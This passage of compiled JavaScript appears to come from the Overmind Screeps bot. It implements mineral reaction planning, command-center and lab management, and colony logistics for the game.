            if (!this.someColonyHasExcess(mineral, mineralQuantities[mineral])) {
                return false;
            }
        }
        return true;
    }
    canBuyBasicMineralsForReaction(mineralQuantities) {
        if (Game.market.credits < TraderJoe.settings.market.reserveCredits) {
            return false;
        }
        for (const mineral in mineralQuantities) {
            let maxPrice = maxMarketPrices[mineral] || maxMarketPrices.default;
            if (!onPublicServer()) {
                maxPrice = Infinity;
            }
            if (Overmind.tradeNetwork.priceOf(mineral) > maxPrice) {
                return false;
            }
        }
        return true;
    }
    static stockAmount(resource) {
        return (wantedStockAmounts[resource] || priorityStockAmounts[resource] || baseStockAmounts[resource] || 0);
    }
    hasExcess(mineralType, excessAmount = 0) {
        return this.assets[mineralType] - excessAmount > Abathur_1.stockAmount(mineralType);
    }
    someColonyHasExcess(mineralType, excessAmount = 0) {
        return _.any(getAllColonies(), colony => colony.abathur.hasExcess(mineralType, excessAmount));
    }
    /**
     * Generate a queue of reactions to produce the most needed compound
     */
    getReactionQueue(verbose = false) {
        // Return nothing if you are sleeping; prevents wasteful reaction queue calculations
        if (Game.time < this.memory.sleepUntil) {
            return [];
        }
        // Compute the reaction queue for the highest priority item that you should be and can be making
        const stocksToCheck = [priorityStockAmounts, wantedStockAmounts];
        for (const stocks of stocksToCheck) {
            for (const resourceType in stocks) {
                const amountOwned = this.assets[resourceType] || 0;
                const amountNeeded = stocks[resourceType];
                if (amountOwned < amountNeeded) { // if there is a shortage of this resource
                    const reactionQueue = this.buildReactionQueue(resourceType, amountNeeded - amountOwned, verbose);
                    const missingBaseMinerals = this.getMissingBasicMinerals(reactionQueue);
                    if (!_.any(missingBaseMinerals)
                        || this.canReceiveBasicMineralsForReaction(missingBaseMinerals, amountNeeded + 1000)
                        || this.canBuyBasicMineralsForReaction(missingBaseMinerals)) {
                        return reactionQueue;
                    }
                    else {
                        if (verbose)
                            console.log(`Missing minerals for ${resourceType}: ${JSON.stringify(missingBaseMinerals)}`);
                    }
                }
            }
        }
        // If there's nothing you can make, sleep for 100 ticks
        this.memory.sleepUntil = Game.time + Abathur_1.settings.sleepTime;
        return [];
    }
    /**
     * Build a reaction queue for a target compound
     */
    buildReactionQueue(mineral, amount, verbose = false) {
        amount = minMax(amount, Abathur_1.settings.minBatchSize, Abathur_1.settings.maxBatchSize);
        if (verbose)
            console.log(`Abathur@${this.colony.room.print}: building reaction queue for ${amount} ${mineral}`);
        let reactionQueue = [];
        for (const ingredient of this.ingredientsList(mineral)) {
            let productionAmount = amount;
            if (ingredient != mineral) {
                if (verbose)
                    console.log(`productionAmount: ${productionAmount}, assets: ${this.assets[ingredient]}`);
                productionAmount = Math.max(productionAmount - (this.assets[ingredient] || 0), 0);
            }
            productionAmount = Math.min(productionAmount, Abathur_1.settings.maxBatchSize);
            reactionQueue.push({ mineralType: ingredient, amount: productionAmount });
        }
        if (verbose)
            console.log(`Pre-trim queue: ${JSON.stringify(reactionQueue)}`);
        reactionQueue = this.trimReactionQueue(reactionQueue);
        if (verbose)
            console.log(`Post-trim queue: ${JSON.stringify(reactionQueue)}`);
        reactionQueue = _.filter(reactionQueue, rxn => rxn.amount > 0);
        if (verbose)
            console.log(`Final queue: ${JSON.stringify(reactionQueue)}`);
        return reactionQueue;
    }
    /**
     * Trim a reaction queue, reducing the amounts of precursor compounds which need to be produced
     */
    trimReactionQueue(reactionQueue) {
        // Scan backwards through the queue and reduce the production amount of subsequently baser resources as needed
        reactionQueue.reverse();
        for (const reaction of reactionQueue) {
            const [ing1, ing2] = REAGENTS[reaction.mineralType];
            const precursor1 = _.findIndex(reactionQueue, rxn => rxn.mineralType == ing1);
            const precursor2 = _.findIndex(reactionQueue, rxn => rxn.mineralType == ing2);
            for (const index of [precursor1, precursor2]) {
                if (index != -1) {
                    if (reactionQueue[index].amount == 0) {
                        reactionQueue[index].amount = 0;
                    }
                    else {
                        reactionQueue[index].amount = minMax(reaction.amount, Abathur_1.settings.minBatchSize, reactionQueue[index].amount);
                    }
                }
            }
        }
        reactionQueue.reverse();
        return reactionQueue;
    }
    /**
     * Figure out which basic minerals are missing and how much
     */
    getMissingBasicMinerals(reactionQueue, verbose = false) {
        const requiredBasicMinerals = this.getRequiredBasicMinerals(reactionQueue);
        if (verbose)
            console.log(`Required basic minerals: ${JSON.stringify(requiredBasicMinerals)}`);
        if (verbose)
            console.log(`assets: ${JSON.stringify(this.assets)}`);
        const missingBasicMinerals = {};
        for (const mineralType in requiredBasicMinerals) {
            const amountMissing = requiredBasicMinerals[mineralType] - (this.assets[mineralType] || 0);
            if (amountMissing > 0) {
                missingBasicMinerals[mineralType] = amountMissing;
            }
        }
        if (verbose)
            console.log(`Missing basic minerals: ${JSON.stringify(missingBasicMinerals)}`);
        return missingBasicMinerals;
    }
    /**
     * Get the required amount of basic minerals for a reaction queue
     */
    getRequiredBasicMinerals(reactionQueue) {
        const requiredBasicMinerals = {
            [RESOURCE_HYDROGEN]: 0,
            [RESOURCE_OXYGEN]: 0,
            [RESOURCE_UTRIUM]: 0,
            [RESOURCE_KEANIUM]: 0,
            [RESOURCE_LEMERGIUM]: 0,
            [RESOURCE_ZYNTHIUM]: 0,
            [RESOURCE_CATALYST]: 0,
        };
        for (const reaction of reactionQueue) {
            const ingredients = REAGENTS[reaction.mineralType];
            for (const ingredient of ingredients) {
                if (!REAGENTS[ingredient]) { // resource is base mineral
                    requiredBasicMinerals[ingredient] += reaction.amount;
                }
            }
        }
        return requiredBasicMinerals;
    }
    /**
     * Recursively generate a list of ingredients required to produce a compound
     */
    ingredientsList(mineral) {
        if (!REAGENTS[mineral] || _.isEmpty(mineral)) {
            return [];
        }
        else {
            return this.ingredientsList(REAGENTS[mineral][0])
                .concat(this.ingredientsList(REAGENTS[mineral][1]), mineral);
        }
    }
};
Abathur.settings = {
    minBatchSize: 100,
    maxBatchSize: 800,
    sleepTime: 100,
};
Abathur = Abathur_1 = __decorate([
    profile
], Abathur);

/**
 * Abstract class for a hive cluster. Hive clusters group structures with related functionalities together in a
 * single cohesive object
 */
let HiveCluster = class HiveCluster {
    constructor(colony, instantiationObject, name, includePos = false) {
        // Set up hatchery, register colony and memory
        this.colony = colony;
        this.room = instantiationObject.room;
        this.pos = instantiationObject.pos;
        // this.componentName = name;
        this.ref = includePos ? name + '@' + instantiationObject.pos.name : name + '@' + this.colony.name;
        this.colony.hiveClusters.push(this);
    }
    get print() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.pos.roomName + '">[' + this.ref + ']</a>';
    }
};
HiveCluster = __decorate([
    profile
], HiveCluster);

var CommandCenter_1;
const MAX_OBSERVE_DISTANCE = 7;
/**
 * The command center groups the high-level structures at the core of the bunker together, including storage, terminal,
 * link, power spawn, observer, and nuker.
 */
let CommandCenter = CommandCenter_1 = class CommandCenter extends HiveCluster {
    constructor(colony, storage) {
        super(colony, storage, 'commandCenter');
        this.memory = Mem.wrap(this.colony.memory, 'commandCenter');
        // Register physical components
        this.storage = storage;
        this.terminal = colony.terminal;
        this.powerSpawn = colony.powerSpawn;
        this.nuker = colony.nuker;
        this.observer = colony.observer;
        if (this.colony.bunker) {
            this.link = this.colony.bunker.anchor.findClosestByLimitedRange(colony.availableLinks, 1);
            this.colony.linkNetwork.claimLink(this.link);
            this.towers = this.colony.bunker.anchor.findInRange(colony.towers, 1);
        }
        else {
            this.link = this.pos.findClosestByLimitedRange(colony.availableLinks, 2);
            this.colony.linkNetwork.claimLink(this.link);
            this.towers = this.pos.findInRange(colony.towers, 3);
        }
        this.terminalNetwork = Overmind.terminalNetwork;
        this.transportRequests = new TransportRequestGroup(); // commandCenter always gets its own request group
        this.observeRoom = undefined;
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'commandCenter');
        $.refreshRoom(this);
        $.refresh(this, 'storage', 'terminal', 'powerSpawn', 'nuker', 'observer', 'link', 'towers');
        this.transportRequests.refresh();
        this.observeRoom = undefined;
    }
    spawnMoarOverlords() {
        if (this.link || this.terminal) {
            this.overlord = new CommandCenterOverlord(this);
        }
    }
    // Idle position
    get idlePos() {
        if (this.colony.bunker) {
            return this.colony.bunker.anchor;
        }
        if (!this.memory.idlePos || Game.time % 25 == 0) {
            this.memory.idlePos = this.findIdlePos();
        }
        return derefRoomPosition(this.memory.idlePos);
    }
    /* Find the best idle position */
    findIdlePos() {
        // Try to match as many other structures as possible
        const proximateStructures = _.compact([this.link,
            this.terminal,
            this.powerSpawn,
            this.nuker,
            ...this.towers]);
        const numNearbyStructures = (pos) => _.filter(proximateStructures, s => s.pos.isNearTo(pos) && !s.pos.isEqualTo(pos)).length;
        return _.last(_.sortBy(this.storage.pos.neighbors, pos => numNearbyStructures(pos)));
    }
    /* Register a link transfer store if the link is sufficiently full */
    registerLinkTransferRequests() {
        if (this.link) {
            if (this.link.energy > CommandCenter_1.settings.linksTransmitAt) {
                this.colony.linkNetwork.requestTransmit(this.link);
            }
        }
    }
    registerRequests() {
        // Supply requests:
        // If the link is empty and can send energy and something needs energy, fill it up
        if (this.link && this.link.energy < 0.9 * this.link.energyCapacity && this.link.cooldown <= 1) {
            if (this.colony.linkNetwork.receive.length > 0) { // If something wants energy
                this.transportRequests.requestInput(this.link, Priority.Critical);
            }
        }
        // Refill towers as needed with variable priority
        const refillTowers = _.filter(this.towers, tower => tower.energy < CommandCenter_1.settings.refillTowersBelow);
        _.forEach(refillTowers, tower => this.transportRequests.requestInput(tower, Priority.High));
        // Refill core spawn (only applicable to bunker layouts)
        if (this.colony.bunker && this.colony.bunker.coreSpawn) {
            if (this.colony.bunker.coreSpawn.energy < this.colony.bunker.coreSpawn.energyCapacity) {
                this.transportRequests.requestInput(this.colony.bunker.coreSpawn, Priority.Normal);
            }
        }
        // Refill power spawn
        if (this.powerSpawn && this.powerSpawn.energy < this.powerSpawn.energyCapacity) {
            this.transportRequests.requestInput(this.powerSpawn, Priority.NormalLow);
        }
        // Refill nuker with low priority
        if (this.nuker) {
            if (this.nuker.energy < this.nuker.energyCapacity && this.storage.energy > 200000) {
                this.transportRequests.requestInput(this.nuker, Priority.Low);
            }
            if (this.nuker.ghodium < this.nuker.ghodiumCapacity
                && (this.colony.assets[RESOURCE_GHODIUM] || 0) >= 2 * Abathur.settings.maxBatchSize) {
                this.transportRequests.requestInput(this.nuker, Priority.Low, { resourceType: RESOURCE_GHODIUM });
            }
        }
        // Withdraw requests:
        // If the link has energy and nothing needs it, empty it
        if (this.link && this.link.energy > 0) {
            if (this.colony.linkNetwork.receive.length == 0 || this.link.cooldown > 3) {
                this.transportRequests.requestOutput(this.link, Priority.High);
            }
        }
    }
    requestRoomObservation(roomName) {
        this.observeRoom = roomName;
    }
    runObserver() {
        if (this.observer) {
            if (this.observeRoom) {
                this.observer.observeRoom(this.observeRoom);
            }
            else if (CommandCenter_1.settings.enableIdleObservation) {
                const dx = Game.time % MAX_OBSERVE_DISTANCE;
                const dy = Game.time % (MAX_OBSERVE_DISTANCE ** 2);
                const roomToObserve = Cartographer.findRelativeRoomName(this.pos.roomName, dx, dy);
                this.observer.observeRoom(roomToObserve);
            }
        }
    }
    // Initialization and operation ====================================================================================
    init() {
        this.registerLinkTransferRequests();
        this.registerRequests();
    }
    run() {
        this.runObserver();
    }
    visuals(coord) {
        let { x, y } = coord;
        const height = this.storage && this.terminal ? 2 : 1;
        const titleCoords = Visualizer.section(`${this.colony.name} Command Center`, { x, y, roomName: this.room.name }, 9.5, height + .1);
        const boxX = titleCoords.x;
        y = titleCoords.y + 0.25;
        if (this.storage) {
            Visualizer.text('Storage', { x: boxX, y: y, roomName: this.room.name });
            Visualizer.barGraph(_.sum(this.storage.store) / this.storage.storeCapacity, { x: boxX + 4, y: y, roomName: this.room.name }, 5);
            y += 1;
        }
        if (this.terminal) {
            Visualizer.text('Terminal', { x: boxX, y: y, roomName: this.room.name });
            Visualizer.barGraph(_.sum(this.terminal.store) / this.terminal.storeCapacity, { x: boxX + 4, y: y, roomName: this.room.name }, 5);
            y += 1;
        }
        return { x: x, y: y + .25 };
    }
};
CommandCenter.settings = {
    enableIdleObservation: true,
    linksTransmitAt: LINK_CAPACITY - 100,
    refillTowersBelow: 750,
};
CommandCenter = CommandCenter_1 = __decorate([
    profile
], CommandCenter);

var EvolutionChamber_1;
const LabStatus = {
    Idle: 0,
    AcquiringMinerals: 1,
    LoadingLabs: 2,
    Synthesizing: 3,
    UnloadingLabs: 4,
};
const LabStageTimeouts = {
    Idle: Infinity,
    AcquiringMinerals: 100,
    LoadingLabs: 50,
    Synthesizing: 10000,
    UnloadingLabs: 1000
};
const LAB_USAGE_WINDOW = 100;
const EvolutionChamberMemoryDefaults = {
    status: LabStatus.Idle,
    statusTick: 0,
    activeReaction: undefined,
    reactionQueue: [],
    labMineralTypes: {},
    stats: {
        totalProduction: {},
        avgUsage: 1,
    }
};
function neighboringLabs(pos) {
    return _.compact(_.map(pos.neighbors, neighbor => neighbor.lookForStructure(STRUCTURE_LAB)));
}
function labsAreEmpty(labs) {
    return _.all(labs, lab => lab.mineralAmount == 0);
}
/**
 * The evolution chamber handles mineral production and boosting logic, handling resource supply for labs
 */
let EvolutionChamber = EvolutionChamber_1 = class EvolutionChamber extends HiveCluster {
    constructor(colony, terminal) {
        super(colony, terminal, 'evolutionChamber');
        this.memory = Mem.wrap(this.colony.memory, 'evolutionChamber', EvolutionChamberMemoryDefaults);
        // Register physical components
        this.terminal = terminal;
        this.terminalNetwork = Overmind.terminalNetwork;
        this.labs = colony.labs;
        // Reserve some easily-accessible labs which are restricted not to be reagent labs
        const restrictedLabs = this.colony.bunker ?
            _.filter(this.labs, lab => lab.pos.findInRange(this.colony.spawns, 1).length > 0) :
            _.take(_.sortBy(this.labs, lab => Pathing.distance(this.terminal.pos, lab.pos)), 1);
        // Reagent labs are range=2 from all other labs and are not a boosting lab
        const range2Labs = _.filter(this.labs, lab => _.all(this.labs, otherLab => lab.pos.inRangeTo(otherLab, 2)));
        const reagentLabCandidates = _.filter(range2Labs, lab => !_.any(restrictedLabs, l => l.id == lab.id));
        if (this.colony.bunker && this.colony.labs.length == 10) {
            this.reagentLabs = _.take(_.sortBy(reagentLabCandidates, lab => -1 * lab.pos.findInRange(this.boostingLabs, 1).length), 2);
        }
        else {
            this.reagentLabs = _.take(_.sortBy(reagentLabCandidates, lab => -1 * neighboringLabs(lab.pos).length), 2);
        }
        // Product labs are everything that isn't a reagent lab. (boostingLab can also be a productLab)
        this.productLabs = _.difference(this.labs, this.reagentLabs);
        // Boosting labs are product labs sorted by distance to terminal
        const unrestrictedBoostingLabs = _.sortBy(_.difference(this.productLabs, restrictedLabs), lab => Pathing.distance(this.terminal.pos, lab.pos));
        this.boostingLabs = [...restrictedLabs, ...unrestrictedBoostingLabs];
        // This keeps track of reservations for boosting
        this.labReservations = {};
        // this.boostQueue = {};
        this.neededBoosts = {};
        if (this.colony.commandCenter && this.colony.layout == 'twoPart') {
            // in two-part layout, evolution chamber shares a common request group with command center
            this.transportRequests = this.colony.commandCenter.transportRequests;
        }
        else {
            // otherwise (in bunker layout), it uses colony/hatchery transport requests
            this.transportRequests = this.colony.transportRequests;
        }
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'evolutionChamber', EvolutionChamberMemoryDefaults);
        $.refreshRoom(this);
        $.refresh(this, 'terminal', 'labs', 'boostingLabs', 'reagentLabs', 'productLabs');
        this.labReservations = {};
        this.neededBoosts = {};
    }
    spawnMoarOverlords() {
        // Evolution chamber is attended to by queens; overlord spawned at Hatchery
    }
    statusTimeoutCheck() {
        const ticksInStatus = Game.time - this.memory.statusTick;
        let timeout = false;
        switch (this.memory.status) {
            case LabStatus.Idle:
                timeout = ticksInStatus > LabStageTimeouts.Idle;
                break;
            case LabStatus.AcquiringMinerals:
                timeout = ticksInStatus > LabStageTimeouts.AcquiringMinerals;
                break;
            case LabStatus.LoadingLabs:
                timeout = ticksInStatus > LabStageTimeouts.LoadingLabs;
                break;
            case LabStatus.Synthesizing:
                timeout = ticksInStatus > LabStageTimeouts.Synthesizing;
                break;
            case LabStatus.UnloadingLabs:
                timeout = ticksInStatus > LabStageTimeouts.UnloadingLabs;
                break;
            default:
                log.warning(`Bad lab state at ${this.print}!`);
                this.memory.status = LabStatus.Idle;
                this.memory.statusTick = Game.time;
                break;
        }
        if (timeout) {
            log.warning(`${this.print}: stuck in state ${this.memory.status} for ${ticksInStatus} ticks, ` +
                `rebuilding reaction queue and reverting to idle state!`);
            this.memory.status = LabStatus.Idle;
            this.memory.statusTick = Game.time;
            this.memory.activeReaction = undefined;
            this.memory.reactionQueue = [];
        }
    }
    initLabStatus() {
        if (!this.memory.activeReaction && this.memory.status != LabStatus.Idle) {
            log.warning(`No active reaction at ${this.print}!`);
            this.memory.status = LabStatus.Idle;
        }
        switch (this.memory.status) {
            case LabStatus.Idle:
                if (this.memory.activeReaction) {
                    const [ing1, ing2] = REAGENTS[this.memory.activeReaction.mineralType];
                    log.info(`${this.colony.room.print}: starting synthesis of ${ing1} + ${ing2} ${rightArrow} ` +
                        this.memory.activeReaction.mineralType);
                    this.memory.status = LabStatus.AcquiringMinerals;
                    this.memory.statusTick = Game.time;
                }
                break;
            case LabStatus.AcquiringMinerals: // "We acquire more mineralzzz"
                const missingIngredients = this.colony.abathur.getMissingBasicMinerals([this.memory.activeReaction]);
                if (_.all(missingIngredients, amount => amount == 0)) {
                    // Loading labs if all minerals are present but labs not at desired capacity yet
                    this.memory.status = LabStatus.LoadingLabs;
                    this.memory.statusTick = Game.time;
                }
                break;
            case LabStatus.LoadingLabs:
                if (_.all(this.reagentLabs, lab => lab.mineralAmount >= this.memory.activeReaction.amount &&
                    REAGENTS[this.memory.activeReaction.mineralType]
                        .includes(lab.mineralType))) {
                    this.memory.status = LabStatus.Synthesizing;
                    this.memory.statusTick = Game.time;
                }
                break;
            case LabStatus.Synthesizing:
                if (_.any(this.reagentLabs, lab => lab.mineralAmount < LAB_REACTION_AMOUNT)) {
                    this.memory.status = LabStatus.UnloadingLabs;
                    this.memory.statusTick = Game.time;
                }
                break;
            case LabStatus.UnloadingLabs:
                if (_.all([...this.reagentLabs, ...this.productLabs], lab => lab.mineralAmount == 0)) {
                    this.memory.status = LabStatus.Idle;
                    this.memory.statusTick = Game.time;
                }
                break;
            default:
                log.warning(`Bad lab state at ${this.print}!`);
                this.memory.status = LabStatus.Idle;
                this.memory.statusTick = Game.time;
                break;
        }
        this.statusTimeoutCheck();
    }
    reagentLabRequests(reagentLabs) {
        if (this.memory.activeReaction) {
            const { mineralType, amount } = this.memory.activeReaction;
            const [ing1, ing2] = REAGENTS[mineralType];
            const [lab1, lab2] = reagentLabs;
            if (!lab1 || !lab2)
                return;
            // Empty out any incorrect minerals and request the correct reagents
            if (this.memory.status == LabStatus.UnloadingLabs || (lab1.mineralType != ing1 && lab1.mineralAmount > 0)) {
                this.transportRequests.requestOutput(lab1, Priority.Normal, { resourceType: lab1.mineralType });
            }
            else if (this.memory.status == LabStatus.LoadingLabs && lab1.mineralAmount < amount) {
                this.transportRequests.requestInput(lab1, Priority.Normal, {
                    resourceType: ing1,
                    amount: amount - lab1.mineralAmount,
                });
            }
            if (this.memory.status == LabStatus.UnloadingLabs || (lab2.mineralType != ing2 && lab2.mineralAmount > 0)) {
                this.transportRequests.requestOutput(lab2, Priority.Normal, { resourceType: lab2.mineralType });
            }
            else if (this.memory.status == LabStatus.LoadingLabs && lab2.mineralAmount < amount) {
                this.transportRequests.requestInput(lab2, Priority.Normal, {
                    resourceType: ing2,
                    amount: amount - lab2.mineralAmount,
                });
            }
        }
        else {
            // Labs should be empty when no reaction process is currently happening
            for (const lab of reagentLabs) {
                if (lab.mineralType && lab.mineralAmount > 0) {
                    this.transportRequests.requestOutput(lab, Priority.Normal, { resourceType: lab.mineralType });
                }
            }
        }
    }
    productLabRequests(labs) {
        if (this.memory.activeReaction) {
            const { mineralType, amount } = this.memory.activeReaction;
            for (const lab of labs) {
                const labHasWrongMineral = lab.mineralType != mineralType && lab.mineralAmount > 0;
                const labIsFull = lab.mineralAmount == lab.mineralCapacity;
                // Empty out incorrect minerals or if it's time to unload or if lab is full
                if ((this.memory.status == LabStatus.UnloadingLabs && lab.mineralAmount > 0) ||
                    labHasWrongMineral || labIsFull) {
                    this.transportRequests.requestOutput(lab, Priority.NormalLow, { resourceType: lab.mineralType });
                }
            }
        }
        else {
            // Labs should be empty when no reaction process is currently happening
            for (const lab of labs) {
                if (lab.mineralType && lab.mineralAmount > 0) {
                    this.transportRequests.requestOutput(lab, Priority.NormalLow, { resourceType: lab.mineralType });
                }
            }
        }
    }
    boosterLabRequests(labs) {
        for (const lab of labs) {
            const { mineralType, amount } = this.labReservations[lab.id];
            // Empty out incorrect minerals
            if (lab.mineralType != mineralType && lab.mineralAmount > 0) {
                this.transportRequests.requestOutput(lab, Priority.NormalHigh, { resourceType: lab.mineralType });
            }
            else {
                this.transportRequests.requestInput(lab, Priority.NormalHigh, {
                    resourceType: mineralType,
                    amount: amount - lab.mineralAmount
                });
            }
        }
    }
    registerRequests() {
        // Separate product labs into actively boosting or ready for reaction
        const boostingProductLabs = _.filter(this.productLabs, lab => this.labReservations[lab.id]);
        const reactionProductLabs = _.filter(this.productLabs, lab => !this.labReservations[lab.id]);
        // Handle energy requests for labs with different priorities
        const boostingRefillLabs = _.filter(boostingProductLabs, lab => lab.energy < lab.energyCapacity);
        _.forEach(boostingRefillLabs, lab => this.transportRequests.requestInput(lab, Priority.High));
        const reactionRefillLabs = _.filter(reactionProductLabs, lab => lab.energy < lab.energyCapacity);
        _.forEach(reactionRefillLabs, lab => this.transportRequests.requestInput(lab, Priority.NormalLow));
        const reagentRefillLabs = _.filter(this.reagentLabs, lab => lab.energy < lab.energyCapacity);
        _.forEach(reagentRefillLabs, lab => this.transportRequests.requestInput(lab, Priority.NormalLow));
        // Request resources delivered to / withdrawn from each type of lab
        this.reagentLabRequests(this.reagentLabs);
        this.productLabRequests(reactionProductLabs);
        this.boosterLabRequests(boostingProductLabs);
    }
    // Lab mineral reservations ========================================================================================
    /* Reserves a product lab for boosting with a compound unrelated to production */
    reserveLab(mineralType, amount, lab) {
        // _.remove(this.productLabs, productLab => productLab.id == lab.id);
        this.labReservations[lab.id] = { mineralType: mineralType, amount: amount };
    }
    /* Return the amount of a given resource necessary to fully boost a creep body */
    static requiredBoostAmount(body, boostType) {
        const existingBoostCounts = _.countBy(body, part => part.boost);
        const numPartsToBeBoosted = _.filter(body, part => part.type == boostParts[boostType]).length;
        return LAB_BOOST_MINERAL * (numPartsToBeBoosted - (existingBoostCounts[boostType] || 0));
    }
    /* Return whether you have the resources to fully boost a creep body with a given resource */
    canBoost(body, boostType) {
        const boostAmount = EvolutionChamber_1.requiredBoostAmount(body, boostType);
        if (this.colony.assets[boostType] >= boostAmount) {
            // Does this colony have the needed resources already?
            return true;
        }
        else if (this.terminalNetwork.assets[boostType] >= 2 * boostAmount) {
            // Is there enough of the resource in terminalNetwork?
            return true;
        }
        else {
            // Can you buy the resources on the market?
            return (Game.market.credits > TraderJoe.settings.market.boostCredits +
                boostAmount * Overmind.tradeNetwork.priceOf(boostType));
        }
    }
    /* Request boosts sufficient to fully boost a given creep to be added to the boosting queue */
    requestBoost(creep, boostType) {
        // Add the required amount to the neededBoosts
        const boostAmount = EvolutionChamber_1.requiredBoostAmount(creep.body, boostType);
        if (!this.neededBoosts[boostType]) {
            this.neededBoosts[boostType] = 0;
        }
        this.neededBoosts[boostType] = Math.min(this.neededBoosts[boostType] + boostAmount, LAB_MINERAL_CAPACITY);
    }
    // Initialization and operation ====================================================================================
    init() {
        // Get a reaction queue if needed
        if (this.memory.reactionQueue.length == 0) {
            this.memory.reactionQueue = this.colony.abathur.getReactionQueue();
        }
        // Switch to next reaction on the queue if you are idle
        if (this.memory.status == LabStatus.Idle) {
            this.memory.activeReaction = this.memory.reactionQueue.shift();
        }
        // Set boosting lab reservations and compute needed resources
        for (const mineralType in this.neededBoosts) {
            if (this.neededBoosts[mineralType] == 0)
                continue;
            let boostLab;
            for (const id in this.labReservations) { // find a lab already reserved for this mineral type
                if (this.labReservations[id] && this.labReservations[id].mineralType == mineralType) {
                    boostLab = deref(id);
                }
            }
            if (!boostLab) { // otherwise choose the first unreserved product lab
                boostLab = _.find(this.boostingLabs, lab => !this.labReservations[lab.id]);
            }
            if (boostLab) {
                this.reserveLab(mineralType, this.neededBoosts[mineralType], boostLab);
            }
        }
        this.initLabStatus();
        this.registerRequests();
    }
    run() {
        // Obtain resources for boosting
        for (const resourceType in this.neededBoosts) {
            const needAmount = Math.max(this.neededBoosts[resourceType] - (this.colony.assets[resourceType] || 0), 0);
            if (needAmount > 0) {
                this.terminalNetwork.requestResource(this.terminal, resourceType, needAmount, true, 0);
            }
        }
        // Obtain resources for reaction queue
        let queue = this.memory.reactionQueue;
        if (this.memory.activeReaction && this.memory.status == LabStatus.AcquiringMinerals) {
            queue = [this.memory.activeReaction].concat(queue);
        }
        const missingBasicMinerals = this.colony.abathur.getMissingBasicMinerals(queue);
        for (const resourceType in missingBasicMinerals) {
            if (missingBasicMinerals[resourceType] > 0) {
                this.terminalNetwork.requestResource(this.terminal, resourceType, missingBasicMinerals[resourceType], true);
            }
        }
        // Run the reactions
        if (this.memory.status == LabStatus.Synthesizing) {
            const [lab1, lab2] = this.reagentLabs;
            for (const lab of this.productLabs) {
                if (lab.cooldown == 0 && !this.labReservations[lab.id]) {
                    const result = lab.runReaction(lab1, lab2);
                    if (result == OK) { // update total production amount in memory
                        const product = this.memory.activeReaction ? this.memory.activeReaction.mineralType : 'ERROR';
                        if (!this.memory.stats.totalProduction[product]) {
                            this.memory.stats.totalProduction[product] = 0;
                        }
                        this.memory.stats.totalProduction[product] += LAB_REACTION_AMOUNT;
                    }
                    else {
                        log.debug(`Couldn't run reaction for lab @ ${lab.pos.print}! Result: ${result}`);
                    }
                }
            }
        }
        // Record stats
        this.stats();
    }
    drawLabReport(coord) {
        let { x, y } = coord;
        const height = 2;
        const titleCoords = Visualizer.section(`${this.colony.name} Evolution Chamber`, { x, y, roomName: this.room.name }, 9.5, height + .1);
        const boxX = titleCoords.x;
        y = titleCoords.y + 0.25;
        let status;
        switch (this.memory.status) {
            case LabStatus.Idle:
                status = 'IDLE';
                break;
            case LabStatus.AcquiringMinerals:
                status = 'acquire minerals';
                break;
            case LabStatus.LoadingLabs:
                status = 'loading labs';
                break;
            case LabStatus.Synthesizing:
                status = 'synthesizing';
                break;
            case LabStatus.UnloadingLabs:
                status = 'unloading labs';
                break;
            default:
                status = 'INVALID';
                break;
        }
        const activeReaction = this.memory.activeReaction;
        const mineral = activeReaction ? activeReaction.mineralType : 'NONE';
        Visualizer.text(`Status: ${status}`, { x: boxX, y: y, roomName: this.room.name });
        y += 1;
        if (this.memory.status == LabStatus.Synthesizing && activeReaction) {
            const amountDone = _.sum(_.map(this.productLabs, lab => lab.mineralType == activeReaction.mineralType ? lab.mineralAmount : 0));
            Visualizer.text(activeReaction.mineralType, { x: boxX, y: y, roomName: this.room.name });
            Visualizer.barGraph([amountDone, activeReaction.amount], { x: boxX + 4, y: y, roomName: this.room.name }, 5);
            y += 1;
        }
        else {
            Visualizer.text(`Active reaction: ${mineral}`, { x: boxX, y: y, roomName: this.room.name });
            y += 1;
        }
        return { x: x, y: y + .25 };
    }
    visuals(coord) {
        const vis = this.room.visual;
        // Lab visuals
        for (const lab of this.labs) {
            if (lab.mineralType) {
                vis.resource(lab.mineralType, lab.pos.x, lab.pos.y);
            }
        }
        // Draw lab report
        return this.drawLabReport(coord);
    }
    stats() {
        Stats.log(`colonies.${this.colony.name}.evolutionChamber.totalProduction`, this.memory.stats.totalProduction);
        const labUsage = _.sum(this.productLabs, lab => lab.cooldown > 0 ? 1 : 0) / this.productLabs.length;
        this.memory.stats.avgUsage = exponentialMovingAverage(labUsage, this.memory.stats.avgUsage, LAB_USAGE_WINDOW);
        Stats.log(`colonies.${this.colony.name}.evolutionChamber.avgUsage`, this.memory.stats.avgUsage);
    }
};
EvolutionChamber.settings = {};
EvolutionChamber = EvolutionChamber_1 = __decorate([
    profile
], EvolutionChamber);

/**
 * Spawns a dedicated hatchery attendant to refill spawns and extensions
 */
let QueenOverlord = class QueenOverlord extends Overlord {
    constructor(hatchery, priority = OverlordPriority.core.queen) {
        super(hatchery, 'supply', priority);
        this.hatchery = hatchery;
        this.queenSetup = this.colony.storage ? Setups.queens.default : Setups.queens.early;
        if (this.colony.terminalState == TERMINAL_STATE_REBUILD) {
            this.queenSetup = Setups.queens.early;
        }
        this.queens = this.zerg(Roles.queen);
        this.settings = {
            refillTowersBelow: 500,
        };
    }
    init() {
        const amount = 1;
        const prespawn = this.hatchery.spawns.length <= 1 ? 100 : DEFAULT_PRESPAWN;
        this.wishlist(amount, this.queenSetup, { prespawn: prespawn });
    }
    supplyActions(queen) {
        // Select the closest supply target out of the highest priority and refill it
        const request = this.hatchery.transportRequests.getPrioritizedClosestRequest(queen.pos, 'supply');
        if (request) {
            queen.task = Tasks.transfer(request.target);
        }
        else {
            this.rechargeActions(queen); // if there are no targets, refill yourself
        }
    }
    rechargeActions(queen) {
        if (this.hatchery.link && !this.hatchery.link.isEmpty) {
            queen.task = Tasks.withdraw(this.hatchery.link);
        }
        else if (this.hatchery.battery && this.hatchery.battery.energy > 0) {
            queen.task = Tasks.withdraw(this.hatchery.battery);
        }
        else {
            queen.task = Tasks.recharge();
        }
    }
    idleActions(queen) {
        if (this.hatchery.link) {
            // Can energy be moved from the link to the battery?
            if (this.hatchery.battery && !this.hatchery.battery.isFull && !this.hatchery.link.isEmpty) {
                // Move energy to battery as needed
                if (queen.carry.energy < queen.carryCapacity) {
                    queen.task = Tasks.withdraw(this.hatchery.link);
                }
                else {
